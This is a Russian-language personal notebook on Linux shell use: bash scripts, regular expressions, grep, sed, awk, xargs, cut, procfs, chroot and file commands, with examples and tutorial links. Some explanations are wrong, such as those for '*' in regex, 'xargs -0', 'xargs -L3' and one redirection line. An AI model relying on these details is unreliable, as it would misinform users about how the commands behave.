 равано grep -Ev "^(#|$)"  /etc/apache2/apache2.conf 
  равано  grep "^[^#]" /etc/apache2/apache2.conf
 = = end GLOBBING = = 


 = = = СКРИПТЫ ЦИКЛЫ  = = = 
файл 27. bash скрипты №1 — Основы GNU
Наш скрипт на git: https://gitlab.com/doatta/myscript !!!!
Цикл статей про bash скрипты: https://habr.com/ru/companies/ruvds/articles/325522/
Bash-скрипты, часть 2: циклы
Bash-скрипты, часть 3: параметры и ключи командной строки
Bash-скрипты, часть 4: ввод и вывод
Bash-скрипты, часть 5: сигналы, фоновые задачи, управление сценариями
Bash-скрипты, часть 6: функции и разработка библиотек
Bash-скрипты, часть 7: sed и обработка текстов
Bash-скрипты, часть 8: язык обработки данных awk
Bash-скрипты, часть 9: регулярные выражения
Bash-скрипты, часть 10: практические примеры
Bash-скрипты, часть 11: expect и автоматизация интерактивных утилит
https://losst.pro/primery-bash-skriptov   Примеры Bash скриптов !  
https://losst.pro/proverka-sushhestvovaniya-fajla-bash 
https://losst.pro/argumenty-komandnoj-stroki-bash
Доизучать  https://losst.pro/argumenty-komandnoj-stroki-bash:   СТОПП!!!
команда shift. Её прямое назначение заключается в сдвиге параметров на одну позицию влево.
 Таким образом, значение из переменной $3 переместится в $2, а из $2 — в $1. Но из $1 значение просто отбросится и не сместится в $0, так как там неизменно хранится название запущенной программы.
 Эта команда является эффективным способом обработки всех параметров, переданных сценарию, особенно, когда нельзя заранее узнать их количество. Достаточно лишь обработать $1, сделать сдвиг и повторить процедуру.

f="file5.zip"
echo "${f%.zip}" # вывод значения f за исключением части ".zip"
file5

Для выполнения математических операций 
использовать конструкцию вида $((a+b)) или $[a+b]
#!/bin/bash
var1=$(( 5 + 5 ))
echo $var1
A=147;B=31
echo $(($A/$B)).$(($A%$B))->4.23 # вывод результата деления A на B, целой и др части

!!! Должно быть разнесение команд if then/for по разным стркокам или в одной с разделением ";"
  if [cmd1]... [cmd2]            или   if [cmd1]..[cmd2]; then cmd3;cmd4; fi 
  then 
  cmd3
  cmd4 
  fi 

#!/bin/bash # в операторе test=[ ]  аргументы/символы должны быть отделены пробелами
count=1
while [ -n "$1" ]
do
echo "Параметр №$count = $1"
count=$[ $count + 1 ]
shift
done


Ещё  вариант использование shift — смещать на несколько позиций.
 Для этого достаточно через пробел указать количество, на которое будет смещён ряд параметров


#!/bin/bash
echo "Первый параметр из переданных: $1"
shift 2
echo "Теперь первый параметр: $1"

Команда basename используется для обрезания пути запущенного сценария,
  что часто необходимо для создания гибких программ.
 basename `which man`

выражения внутри скриптов 
 $# - количество аргументов, переданных в скрипт
 $@ - все аргументы, переданные в скрипт
 $0 - имя сценария

 $$ - PID идентификатор процесса bash
 echo $? // просмотр код выхода предыдущей выполненой команды/программы

true  // команда,возражающая "истино" (код выхода 0)
echo $?  -> 0
false // команда,возражающая "ложь" (код выхода 1)
echo $?  -> 1

true && pwd  -> /home/oem
false || pwd -> /home/oem


Массивы https://linuxhint.com/manipulate-control-data-bash-arrays/ и др виды см тут
F[0]='line0';F[0]='line0'; printf 'file=%s\n' "${F[@]}"
declare -a names=('Michael' 'David' 'Alexander' 'Thomas' 'Robert' 'Richard'); printf '%s\n' "${names[@]}"

ДОРАБОТАТЬ
date | cut -d" " -f5 | cut -d: -f1 //выделить час из текщего времени
сделать скрипт - установить  ~/.bashrc привествие echo "Have a nice day/night,$USER"
day night -точно

 * * * for цикл  * * *
for i in {1..10}; do echo "(${RANDOM:0:3}) ${RANDOM:0:3}-${RANDOM:0:4}" >> phonelist.txt; done
Эта команда создаст файл с именем phonelist.txt, содержащий 10 телефонных номеров
for i in * ; do echo $i; done // вывести все файлы в каталоге
for i in {1..100}; do touch /tmp/ffile$i;done // создать 100 файлов /tmp/ffilei
for i in {1..10}; do echo "Line $i" >> f1; echo "strka $i" >> f2; done

for f in /sys/devices/system/cpu/vulnerabilities/*; do echo "${f##*/} -" $(cat "$f"); done 

FILES=$(ls);\ // занести в FILES список всех названий файлов;
j=1;for file in ${FILES[@]}; do echo File$j: $file; j=$(($j+1));done #пройти переменной file п
  последовательно по массиву FILES и  вывести названия файлов  // я[@] - вещь не обязательная? 
                                        см man bash -> ${name[@]}
   * END for цикл * 


https://linuxhint.com/bash_globbing_tutorial/ скрипты и globbing
https://linuxhint.com/create-progress-bar-bash/ скрипты создания progressbar

#!/bin/bash   // скрипт ввода подтверждения
echo "Do you want to confirm?"
read answer
case $answer in
[Yy]* )  echo "confirmed.";;
[Nn]* )  echo "Not confirmed.";;
*) echo "Try again.";;
esac

https://netbeez.net/blog/fix-iperf-bug/ скрипты для iperf
 делать в цикле прверку запущен ли iperf как сервер и если он не в состоянии ESTABLISHED 
                           перезагружать его 
#!/bin/bash 
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
for i in {1..10}; do
 pid=$(ps ax | grep "iperf -s -D" | grep -v grep | awk '{print $1;}')

    if [ "$pid" == "" ]; then
        echo "$0: iperf process not found. Starting iperf"
        iperf -s -D
        exit 0
    fi
                    # grep -q  - подавлять вывод результатов, фунционал для скриптов!!!!
    established=$(netstat -tunap | grep $pid/ipe | grep -q ESTABLISHED)
    # след операторы - проверка условия успешного выполнения пред команды netstat (с кодом 0)
    if [ "$?" == "0" ]; then 
        echo "$0: iperf pid $pid established. Not restarting iperf process"
    else
        echo "$0: killing iperf server with pid: $pid"
        kill -9 $pid
        echo "$0: Restarting iperf server and exiting"
        iperf -s -D
        break
    fi
    sleep 30
done
exit 0

{ Передать аргумент
ПЕРЕДАЧА аргументов И ЧТЕНИЕ ЗАЧЕНИЙ/аргументов, ПЕРЕДАННЫХ ПО КОНВЕЙЕРУ в stdin
echo file | (read a; touch '/tmp/'$a; echo '/tmp/'$a) // прочитать из конв-ра от echo "file" в
   переменную а, затем создать файл в каталоге /tmp/file  скобки () важны!

echo one1 two2 | (read a b; echo $a'+'$b;) // прочитать 2 вход параметра
one1+two2 }


 = = = END СКРИПТЫ ЦИКЛЫ  = = = 

date tzselect - установить время и временную зону

=	=	=	=	 Регулярные выражения	regexpr =	=	=	=	
https://habr.com/ru/articles/545150/
https://losst.pro/poisk-fajlov-po-soderzhimomu-v-linux
https://regex101.com/ - online редактор regexpr 
_____________________________________________________________________________________________
Метасимволы Регулярыных выражений RegRegexpr   |  Метасимволы шаблонных выражений/Patterns
(для поиска и замены ТЕКСТА/СТРОК в файлах)    |   (для поиска ИМЕН  файлов) 
_______________________________________________|_____________________________________________
. один символ кроме переноса строки (newline)		? один любой символ 
\. - символ "."
.* любые символы в любом количестве 			* любые символы в любом количестве 
^\ * найти строку, начинающуся с символов пробела в любом количестве
^\ + найти строку, начинающуся с символов пробела в любом количестве
\w \d \s - слово - цифра - пробельный символ
\W \D \S - НЕслово - Нецифра - НЕпробельный символ
\s - символ пробела
\* - символ "*"
\\ - символ "\"
ls | grep .*.txt$ //вывод файлов имя которых содержит любые символы, заканчивается на txt

[adg] [124] любой символ из множества adg / 124
^[adg] начинающийся с любого символа из множества adg
[^adg] любой символ НЕ из множества adg
[^а-в8] юбой символ, кроме а,б,в и цифры 8
^[^adg] начинающийся c символа НЕ из множества adg
[нл] — только «н» и «л»
[а-я] — все русские буквы в нижнем регистре от «а» до «я» (кроме «ё»)
[А-Я]    — все заглавные русские буквы
[А-Яа-яЁё]  — все русские буквы
[a-z]  — латиница мелким шрифтом
[a-zA-Z]  — все английские буквы
[0-9]  — любая цифра
[В-Ю]   — буквы от «В» до «Ю»
[А-ГО-Р]   — буквы от «А» до «Г» и от «О» до «Р»
[0-3][0-9]\.[0-1][0-9]\.[12][09][0-9][0-9] - шаблон  ДД.ММ.ГГГГ c 1900 -2099 
                        (НЕ совсем коррекный, т.к. допускает 32..39 дни 13..19месяцы )
(0[1-9]|[1-2][0-9]|3[01])\.([0][1-9]|[1][12])\.([12][09][0-9][0-9]) 
   - шаблон  ДД.ММ.ГГГГ c 1900 -2099 корректный - РАБОТАЕТ в less, НЕ рАБОТАЕТ в grep
кажду чаcть regexp, где есть выбор, следует брать в скобки (| | | )  !!!!
0[1-9]|[12][0-9]|3[01]  шаблон ДНИ МЕСЯЦА (коррекный, не допускает 32.. дня )


Якоря: 
 ^ -начало строки  $ - конец строки 
 \b граница слова \B Неграница слова

\s - символ пробела
/m+ - найти симолы m от одного или больше
/m* - найти симолы n от одного или больше
/^\ *export - найти строку, начинающуюся с символов пробела, в любом количестве,
      затем слова export
/s{2} найти сочетания двух ss по тектсу
/\.{3} найти сочетания трех "..." по тексту

^\d{3} - !расширенные! рег.выражения - найти строки, начинающиеся 3мя цифрами

is|ed - найти is или ed по тексту
Regex: Ан|ля
Найдет:
Аня
Анна
Аля
Оля
Малюля
Regex:A(н|л)я
Найдет:
Аня
Аля
  = = {min, max} = = \
/s{0,2} - выделить буквы s и ss по тексту

grep -P '^\d{3}' find.txt //-P !расширенные Perl! рег.выражения 
                    / найти строки, начинающиеся 3мя цифрами

    * * *  grep  * * *
https://losst.pro/gerp-poisk-vnutri-fajlov-v-linux?cmdurl=1
-E, --extended-regexp - включить расширенный режим синтаксиса регулярных выражений (ERE);
-F, --fixed-strings - рассматривать шаблон поиска как обычную строку, а не регулярное выражение;
-G, --basic-regexp - интерпретировать шаблон поиска как базовое регулярное выражение (BRE);
-P, --perl-regexp - рассматривать шаблон поиска как регулярное выражение Perl;
-e, --regexp - альтернативный способ указать шаблон поиска, опцию можно использовать несколько раз, что позволяет указать несколько шаблонов для поиска файлов, содержащих один из них;
-f, --file - читать шаблон поиска из файла;
-i, --ignore-case - не учитывать регистр символов;
-v, --invert-match - вывести только те строки, в которых шаблон поиска не найден; инвертированной поиск обратный!!!!
-w, --word-regexp - искать шаблон как слово, отделенное пробелами или другими знаками препинания;
-x, --line-regexp - искать шаблон как целую строку, от начала и до символа перевода строки;
-c - вывести количество найденных строк;
--color - включить цветной режим, доступные значения: never, always и auto;
-L, --files-without-match - выводить только имена файлов, будут выведены все файлы в которых выполняется поиск;
-l, --files-with-match - аналогично предыдущему, но будут выведены только файлы, в которых есть хотя бы одно вхождение;
-m, --max-count - остановить поиск после того как будет найдено указанное количество строк;
-o, --only-matching - отображать только совпавшую часть, вместо отображения всей строки;
-h, --no-filename - не выводить имя файла;
-q, --quiet - не выводить ничего;
-s, --no-messages - не выводить ошибки чтения файлов;
-A, --after-content - показать вхождение и n строк после него;
-B, --before-content - показать вхождение и n строк перед ним;
-C - показать n строк до и после вхождения;
-a, --text - обрабатывать двоичные файлы как текст;
--exclude - пропустить файлы имена которых соответствуют регулярному выражению;
--exclude-dir - пропустить все файлы в указанной директории;
-I - пропускать двоичные файлы;
--include - искать только в файлах, имена которых соответствуют регулярному выражению;
-r - рекурсивный поиск по всем подпапкам;
-R - рекурсивный поиск включая ссылки;
 Расширенные REG РЕГУЛЯРНЫЕ выражения в  grep.
Для активации расширенного синтаксиса нужно использовать опцию -E.  !!!!!
+ - одно или больше повторений предыдущего символа; !!!!!!!!!!!!!!!!!!!
? - ноль или одно повторение предыдущего символа;
{n,m} - повторение предыдущего символа от n до m раз;
| - позволяет объединять несколько паттернов. 
Например, вместо использования опции -e, можно объединить несколько слов для поиска вот так:
grep -E "root|daemon" /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

grep  -Ev "tcp|udp"  /etc/services
amqp            5672/sctp
# Datagram Delivery Protocol services
rtmp            1/ddp                   # Routing Table Maintenance Protocol.....

man grep | grep -E ^\ +-l //вывести справку man и вней найти строку, начинающуюся из 
  // любого количества пробелов (<\ > - пробел, <+> - любое кол-во) и затем символов <-l>
  // также ERE можно задавать в less при поиске

grep -rl bash /etc/ // -r найти рекурсивно(во всех вложенных папках /etc/)
    // и -l вывыести на экран перечень файлов, где в тексте слово  'bash'
{n,m} - повторение предыдущего символа от n до m раз;


https://blog.sedicomm.com/2018/07/22/12-prakticheskih-primerov-komandy-grep-v-linux/#2-3   // 12 практических 
grep -c txt  f.txt // подсчитать кол-во строк в f.txt, содержащих фразу 'txt'
grep -i txt  f.txt //вывод строк, сод-щих txt с игнорированием регистра txt TXT TxT tXt ...
apt-cache search bind | grep -i '\ bind\ ' //вывод строк, сод-щих отдельные слова bind BIND Bind в результатах поиска
grep -i '\ txt\ ' find.txt  // найти отдельные слова " txt ", " txT "идр ... в  файле
grep txt  f.txt // ывод строк из f.txt, содержащих фразу 'txt'
grep '^fil' find.txt  // вывод строк из f.txt, Начинающихся с 'fil' (^ якорь начинающий)
grep ^[fmk] find.txt  // вывод строк из f.txt, Начинающихся с f или m или k (^ якорь начинающий)
grep txt$   f.txt  // вывод строк из f.txt,  заканчив-ся на 'txt' ($ якорь завершающий)
grep -i ^txt$ find.txt // вывод строк из f.txt, СОСТОЯЩИХ ТОЛЬКО из 'txt' 

grep ^[a-z] file //вывод строк из file, начинающихся со строковых символов-букв
grep ^[^a-z] file //вывод строк из file, начинающихся c символов, НЕ являющихся строк.символами-буквами
grep ^[^#] /etc/fstab //вывод строк из file, НЕ начинающихся c символа #
grep ^[#] /etc/fstab // вывод строк из file, Начинающихся c символа #
grep ^[^6481] file // вывод строк из file, НЕ начинающихся c цифр  1 4 6 8 
grep [95] file // вывод строк из file, СОДЕРЖАЩИХ в cебе  цифры 9 или 5

grep -c ^.*$ /usr/share/dict/words // вывести кол-во строк содержащих любые символы ()
идентично:
wc -l /usr/share/dict/words //  вывести кол-во всех строк в файле

grep  ^ar..$ /usr/share/dict/words // найти строки, начинающиеся с ar и заканчивающиеся любыми 2 символами
grep  ^M.*sk$ /usr/share/dict/words // найти строки, начинающиеся с M и заканчивающиеся sk
Minsk
Murmansk
find ~ -name "*[^0-9]\.txt" // найти все файлы, оканчивающиеся на ".txt",  
           не содержащие в имени цифр 
Результат:
file.txt - да
file_1.txt - нет 
1.txt -нет
           !!! find  аргумент имени '-name' всегда следует набирать в ковычках " "
!!!! ВАЖНО ЭКРАНИРОВАТЬ (брать в "") ШАБЛОННЫЕ ВЫРАЖЕНИЯ В ПОИСКЕ ПО ИМЕНИ в find !!!!

grep '..[а-я]\ [0-9][0-9]\ [0-9][0-9]:[0-9][0-9]' find.txt 

    //найти строки, удовл шаблону "abc XX XX:XX ", предварительно в find.txt записаны результаты 'ls -ial'
573755 drwx------  3 oem     oem       4096 мар 11 14:51 .local
573991 drwx------  4 oem     oem       4096 мар 11 21:10 .mozilla
570184 -rw-r--r--  1 oem     oem        807 мар 11 14:48 .profile
943505 -rw-------  1 oem     oem          0 июн 28 21:54 config-err-aOo70w
944006 drwxrwxrwx  2 oem     oem       4096 июн 28 21:54 mintUpdate
grep 'fruits\[[0-9]\]' find.txt //найти все строки fruits[] с ОДНОЙ любой цифрой в скобках
fruits[0] = “апельсин”;
fruits[1] = “яблоко”;
fruits[9] = “лимон”;
grep 'fruits\[.*[0-9]\]' find.txt //найти все строки fruits[] с любым количеством цифр в скобках
fruits[0] = “апельсин”;
fruits[1] = “яблоко”;
fruits[9] = “лимон”;
fruits[10] = “банан”;
fruits[325] = “абрикос"
grep  'fruits\[..[0-9]\]' find.txt
fruits[325] = “ абрикос"  h

ps aux | grep sshd | grep -v grep  // 2й "grep -v grep" нужен, чтобы исключить из результатов
                               // вывод инф-ции процесса запроса самого grep 
ps aux | grep sshd
root      918  0.0  0.4  15420  8848 ?        Ss   22:45   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root     3029  0.0  0.5  19128 11504 ?        Ss   22:46   0:00 sshd: oem [priv]
oem      3045  0.0  0.4  19260  8132 ?        S    22:46   0:00 sshd: oem@pts/0
oem      3711  0.0  0.1  11772  2460 pts/0    S+   23:02   0:00 grep --color=auto sshd


apt-cache search ldap | grep ldap | grep krb

 = = sed  —!Доизучать! потоковый редактор для фильтрации и преобразования текста = = 
https://linuxhint.com/50_sed_command_examples/  50 примеров!!!
см awk и sed  в Unix programming environment.pdf
https://habr.com/ru/companies/ruvds/articles/325522/

sed -n "31,45p" find.txt # вывод строк с 31 по 45 файла
sed 's/регулярное_выражение/строка_замены/' file.txt
sed -i 's/ABC/abc/g' f1 #  заменить в файле ABC на abc и сохранить!

echo "aaabbbccc" | sed 's/bbb/BBB/' //заменить(s/) во вход данных  bbb на BBB
aaaBBBccc
СТОП Доизучать
= = END sed  = =
    = = = tr = = =
tr --help // Преобразует, уплотняет и/или удаляет символы со стандартного ввода и
печатает на стандартный вывод.
echo $PATH | tr ":" "\n" // tr замена символа в строке, вывести список каталогов не  
              с разделением по ":", с новой строки

less f.txt | tr [:digit:] X  // передать файл в stdout и заменить при этом все цифры знаком X
dhdj XXXXXXXX jddkj k XXXjffdk oope XXXXX
cat f.txt  | tr [:alnum:] X | less // вывести f.txt, заменив нем все буквы и цифры на Х
см tr --help 

    = = = awk = = =
см awk  в Unix programming environment.pdf
https://habr.com/ru/companies/ruvds/articles/325522/
gawk это язык распознавания и обработки шаблонов.
По умолчанию используются стандартные потоки ввода и вывода.
Examples:
        awk '{ sum += $1 }; END { print sum }' file
1) awk -F: '{ print $1" "$3}' /etc/passwd //вывод знач 1 и 3го стлбцов passwd,разделbт-ль ":"
oem
sssd
sshd
mvn
2)ls -lh | grep .*.txt$ | awk '{print $5 " " $9}' 
20K f1.txt
160K f2.txt
...   # выбрать файлы имя которых содержит любые символы, заканчивается на txt 
    -rw-rw-r-- 4 oem     oem      20K июл 10 09:21 f1.txt
    -rw-rw-r-- 1 oem     oem     160K июл 10 09:21 f2.txt и ...
  # вырезать из списка 5й и 9й столбец, вывести на stdout
3) dpkg -S `which dig` | awk -F: '{print $1}'  // вывести первый аргумент результат поиска dpkg...
4) df -h / | awk '{print $1"\t"$3"\t"$5}' #вырезать 1,3,5 столбец из df, между столбц - tab 
5) cat f.txt
 960714 drwxrwsr-x  2 root staff  4096 апр 18  2022 local/
 303625 lrwxrwxrwx  1 root root      9 мар 11 14:47 lock -> /run/lock/
1270238 drwxrwxr-x 14 root syslog 4096 июл 10 11:47 log/
1270239 drwxrwsr-x  2 root mail   4096 дек 18  2022 mail/
cat f.txt | awk '$5=="syslog" {print $5" "$9" "$10}' #вывод 5 9 10 столбцов файла при условии 5го столбца
syslog 11:47 log/

    = = = end awk = = =

= = xargs cut  = = = = =  !!!!!!!!!!!!продолжить Доизучать
 xargs – конструирует команды на основе данных, полученных из стандартного
ввода, и выполняет их. https://losst.pro/komanda-xargs-linux
cut  - вырезать части строк (см ниже)

Синтаксис команды xargs
$ первая_команда | xargs опции вторая_команда аргументы

Сначала выполняется любая первая команда и весь её вывод по конвейеру передается в xargs.
  Затем этот !! вывод разбивается на строки !! и для каждой строки вызывается вторая команда,
  а полученная строка передаётся ей в аргументах.

ls ~/f* | xargs -t echo // echo - команда по умолчанию, можно не указывать

Если надо чтобы каждый вывод обрабатывала отдельно вызванная команда, надо использовать опции:
 -Lx или -n, 
-Lx  позволяет указать сколько строк надо передавать в одну команду.
-n - сколько параметров. 
Для того чтобы разбивать строки по этому символу используется опция -0 или --null. 
 Но для того чтобы всё сработало надо, чтобы и поставляющая данные команда тоже 
 выводила этот символ.
find ~/f* -type f  | xargs -p -L3 cat //найти всефайлы на f и содержимое каждого файла через cat
  // -p спрашивать подтверждение для каждого действия -L3 выводить в 3 трий столбеца

найти пустые файлы в текущей дир-ри и удалить с подтвержденим (-p) !!!!
find . -maxdepth 1 -type f -name "*.cer" -size 0 | xargs -p rm
rm ./1.cer ./2.cer?...y

find ~/f* -type f  | xargs wc № посчитать кол-во файлов на f*
find  /usr/share/man/ -name "??"  | grep -v "ru" | grep -v /uk/ | xargs du -sh # найти все каталоги 
                                   справок кроме как на рус и англ языках и посчитать изх размер

cut -d'' -f3 file.txt - вырезать третье поле из строки с разделителями символов прбелами ' ' 
  = = = cut + xargs = = =
cut -d: -f1 < /etc/passwd | sort | xargs -0//   Вывод краткого отсортир-го списка пользователй в системе 
  предварительно вырезанных командой cut по первому столбцу, "-0" заменить " " на "\n" в выводе
_apt
avahi
avahi-autoipd
backup
ключ -0 позволяет корректно отображать вывод если в имени файла есть пробелы
1)пусть: ls /tmp/tt*
'/tmp/ttmp1 file .txt' 
'/tmp/ttmp2 file .txt' 
2) без "-0:" -> ошибка
sudo find /tmp -name "tt*" -type f -print0 | sort | xargs
xargs: ПРЕДУПРЕЖДЕНИЕ: из входного потока получен символ NUL. Его невозможно передать в списке аргументов. 
                                           Может стоит указать параметр --null?
/tmp/ttmp3 file .txt file .txt file .txt
3) с применением "-0:" - нет ошибки
sudo find /tmp -name "tt*" -type f -print0 | sort | xargs -0
/tmp/ttmp1 file .txt /tmp/ttmp2 file .txt  /tmp/ttmp3 file .txt 


find /tmp -name core -type f -print0 | xargs -0 /bin/rm -f // 
 найти и  удалить файлы корректно, даже если те содержат пробелы  в имени
   -print0 - позволяет корректно выводить имена файлов ссимволами " newlines or other types of white space "
              corresponds to the -0 option of xargs.
  Find files named core in or below the directory /tmp and  delete  them,  processing
  filenames  in such a way that file or directory names containing spaces or newlines
  are correctly handled.

find / -type f -perm /a=x  2>/dev/null | xargs file | grep Python //найти все исполняемые Python скрипты 

 = = = cut = = =  доизучать 
cut -f 1 -d ":" /etc/passwd | xargs touch /создать файлы с именами всех пользователей системы
ps aux | cut -f 1 -d " " | sort| uniq // вывести в алфавит порядке все пользователи системы выполняющие процессы

cut вырезать секции(ю)колонку в каждой СТРОКЕ файла (стандартном потоке ввода)
file /usr/bin/* | grep scrip | grep Bourn | cut -f 1 -d : // вырезать из вывода  file... 
                                            первую секцию по разделитню ":"
less  file
11; 12; 13; 14; 15;
21; 22; 23; 24; 25;
31; 32; 33; 34; 35;                                              
cut -f 2 -d ';' file
 12
 22
 32




procfs
взято из $man proc
/proc/$$/ - папка для процесса теущего bash

/proc/cmdline //              Arguments passed to the Linux kernel at boot time.

/proc/[pid]/cmdline  // file holds the complete command line for the process,  unless
              the process is a zombie.
cat /proc/3889/cmdline
ping127.1.2.3
/proc/[pid]/comm  This file exposes the process's comm value—that is, the command name associ‐
              ated  with the process.
/proc/[pid]/cwd //symbolic link to the текуз\щей рабочей директории,  откуда запущен процесс
/proc/[pid]/environ //This file contains the initial environment that was set when currently
              executing  program  was started via execv
/proc/[pid]/exe  //file is a symbolic link containing the actual pathname of the executed command.
                 //ссылка на оригинальный запущенный файл
/proc/[pid]/root      UNIX and Linux support the idea of a per-process root of the filesystem, set
              by the chroot(2) system call.  This file is a symbolic link that  points  to
              the process's root directory, and behaves in the same way as exe, and fd/*.
            // ссылка на корневую директорию
/proc/zoneinfo //file displays information about memory zones.

/proc/[pid]/task // directory that contains one subdirectory for each  thread  in  the
              process.
/proc/[pid]/status
              Provides  much  of the information in /proc/[pid]/stat and /proc/[pid]/statm
              in a format that's easier for humans to parse.

$ cat /proc/1/environ | tr '\000' '\n'

                ===  chroot изменить корневой каталог -> средство отладки    === 
https://serverspace.by/support/help/kak-ispolzovat-utilitu-chroot-v-linux/?ysclid=lmw83064qd743372342
mkdir /mnt/chrdir // создать каталог, в котором будет новая среда
cp -R /bin /sbin /lib /lib32 /lib64 /usr /etc /mnt/chrdir // рекурсивно скопировать основные файлы ядра
chroot /mnt/chrdir /bin/bash - запустить bash в новой среде
Как устранить ошибку 'chroot: failed to run command ‘/bin/bash’: No such file or directory'
Ошибка возникает из-за отсутствия в каталоге, который делается корневым, необходимых библиотек и бинарных файлов. В частности, судя по ошибке, нет файла оболочки /bin/bash.
Исправить ошибку можно скопировав файлы хост системы в chroot. Это безопасно делать если 
 используемая система и система, в которую выполняется chroot используют один дистрибутив.
cp /bin/bash /env0/bin
Также может потребоваться скопировать зависимости /bin/bash, их можно посмотреть выполнив ldd /mnt/bin/bash
https://server-gu.ru/chroot-linux/?ysclid=lmw8pwd05x235452057


 ==== pgerp  ==== 
     pgrep looks through the currently running processes and lists the process IDs which
     match the selection criteria to stdout.  All the criteria have to match. 
'pgrep abcd' = 'ps aux | grep abcd'
pgrep -u root sshd // найти все процессы, запущенные от пользователя (-u) root и содержащие 'sshd'
 //     only list the processes called sshd AND owned by root
pgrep -u root,daemon //list the processes owned by root OR daemon.

 = = = Спецсимволы с \ = = =
  \\              обратная косая черта
  \a              звуковой сигнал
  \b              забой - Я удалить один символ перед
  \f              перевод страницы
  \n              новая строка
  \r              возврат каретки - Я удалить всю строку перед
  \t              горизонтальная табуляция
  \v              вертикальная табуляция

 = = Создание и копирование каталогов вложенных каталогов  = = 
mkdir -p dir1/dir2/dir3
touch d1/fd1{1..3} touch d1/d2/fd2{1..3} touch d1/d2/d3/fd3{1..3}
mkdir -p  /tmp/{2000..2010}/{01..12}/  // создать множество каталогов по годами и месяцам
touch  /tmp/{2000..2010}/{01..12}/day{0..23}.txt //создать в каталогх файлы
cp -R /dir_source /dir_dist  # Рекурсивное копирование каталогов !

 = = Удаление каталогов и файлов = =
rmdir dir1;  rmdir -p dir1/dir2 // удаление ПУСТНЫХ! каталогов
rm -Ri dir1 //удалить рекурсивно dir1 !c подтверждением!
rm -Rfv dir1 // -R включает рекурсивное удаление dir1 и !всех !подкаталогов и файлов в них 

rm -i ./f // удалить файл "f" !c подтверждением!
rm ./f // удалить файл "f" без подтверждением
-f - разрешает удалять файлы без запроса, а -v показывает имена удаляемых файлов
rm `find . -maxdepth 1 -size 0` // найти все пустые файлы и удалить их

ls -R dir1/  // отображение вложенных каталогов рекурсивно
dir1:
dir2  fd11  fd12  fd13
dir1/dir2:
dir3  fd21  fd22  fd23
dir1/dir2/dir3:
fd31  fd32  fd33

 = = Просмотр и поиск файлов = = =
ls -sh // просмотр расмеров файлов в формате в Mбайтах всместо БЛОКОВ
ls -h // просмотр в пользовательском/человеческом  формате в Mбайтах всместо БЛОКОВ
ls -hlSr // просмотр отсортированных по размеру файлов в обратном порядке
ls -hltr // просмотр отсортированных по времени файлов в прямом порядке
locate abc // поиск файлов по именам В БАЗЕ ДАННЫХ ИМЕН. ПОДРОБНЫЙ СПИСОК Всех папок, где встречается файл с "gcc"
    см ниже подробно раздел           # locate+FIND 1 # 
find / -samefile f1lnkT 2>/dev/null // найти файлы с одинаковым inode c файлом f1lnkT
/home/oem/f1lnk
/home/oem/f1.txt
/home/oem/f1lnk2
/home/oem/f1lnkT

ls -ilah  // просмотр inode/ i-node (первый столбец при ключе ls -i)
total 680K
...             Кол-во hardlink (имен файлов) - 3-й столбец  
573746 drwxr-xr-x 21 oem    oem   4,0K мая  7 15:19 .config
577090 -rw-rw-r--  1 oem    oem   7,1K мар 20 23:51 file1
531052 drwxrwxr-x  4 oem    oem   4,0K ноя 23  2021 debian
573751 drwxr-xr-x  2 oem    oem   4,0K июн  7 23:47 Desktop
577287 -rw-rw-r--  1 oem    oem    42K мар 29 23:39 file2
554365 -rw-rw-r--  4 oem    oem  20427 июл 10 12:21 f1lnk  //одинаковый inode, hardlink f1.txt
554365 -rw-rw-r--  4 oem    oem  20427 июл 10 12:21 f1lnk2 //одинаковый inode, hardlink f1.txt
554365 -rw-rw-r--  4 oem    oem  20427 июл 10 12:21 f1lnk3 //одинаковый inode,hardlink f1.txt
554365 -rw-rw-r--  4 oem    oem  20427 июл 10 12:21 f1.txt //одинаковый inode
РАСШИФРОВКА:
1 №inode / i-node
2 -rw-r-r-- Права доступа к файлу. Первый символ указывает тип файла
3 Количество жестких ссылок (hardlink=/имен) файла (для каталога dir это минимум "2" = "./","../")
4-5 root Имя пользователя, владеющего файлом root Имя группы, владеющей файлом
6 Размер файла в байтах
7 2012-04-03 11:05 Дата и время последнего изменения файла 
8 Имя файла
total - всего всех файлов в каталоге в байтах

ls -l /usr/bin/cal // посмотр, на что указывает мягкая ссылка cal
lrwxrwxrwx 1 root root 4 янв 29  2022 /usr/bin/cal -> ncal
ls -lL /usr/bin/cal //данные о файле, на который мягкая ссылка cal
-rwxr-xr-x 1 root root 37832 янв 29  2022 /usr/bin/cal
ls -l /usr/bin/write // посмотр, на что указывает мягкая ссылка write
ls -il /usr/bin/rlogin
  655388 lrwxrwxrwx 1 root root 24 мар  8 12:55 /usr/bin/rlogin -> /etc/alternatives/rlogin
ls -il /etc/alternatives/rlogin
  785398 lrwxrwxrwx 1 root root 15 мар  8 12:55 /etc/alternatives/rlogin -> /usr/bin/slogin
ls -il  /usr/bin/slogin
  664207 lrwxrwxrwx 1 root root 3 ноя 23 10:38 /usr/bin/slogin -> ssh

ll  = ls -al !!!!
ls -l /dev/ // просмотр всех файлов устройств
ls *.txt // список файлов txt
ls -r //r - обратный порядок сортировки;
ls -tl // список с сортировкой по возрастанию времени создания/изменения файлов
ls -trl // список с сортировкой по убыванию времени создания/изменения файлов
ls -lSh // сортировкой по убыванию размера файлов
ls -lShr // сортировкой по возрастанию размера файлов
ls -A или -a //=la // Список со СКРЫТЫМИ (*.abc) файлами 
la // Список со СКРЫТЫМИ (*.abc) файлами 
ls -d .* // Список ТОЛЬКО СКРЫТЫХ (*.abc) файлов
ls -alF //=ll ПОДРОБНЫЙ Список со СКРЫТЫМИ файлам 
ls -CF //=l 
ls -l /dev/ | grep "^l" // выделение файлов-ссылок с атриб-м l
ls -il f* r* // вывод для файлов на f и r
ls /bin/ | tail -4; ls /bin/ |head -5 //// показать последние 4 и первые 5 строки списка файлов в каталоге
ls /fff/ggg/hhh &>/dev/null // НЕ ОТОБР НА ТЕРМИНАЛЕ ОШИБКУ,send err-msge to 'null'
ls /fff/ggg/hhh > lst.txt &>ferr.txt  // НЕ ОТОБР НА ТЕРМИНАЛЕ ОШИБКУ,send err-msge в отдельном ferr.txt
ls /fff/ggg/hhh > lst.txt 2>&1  // НЕ ОТОБР НА ТЕРМИНАЛЕ ОШИБКУ,сохранить err-msge в файле lst.txt
ls /etc/   // лист каталогов и ф-лов в корне /etc
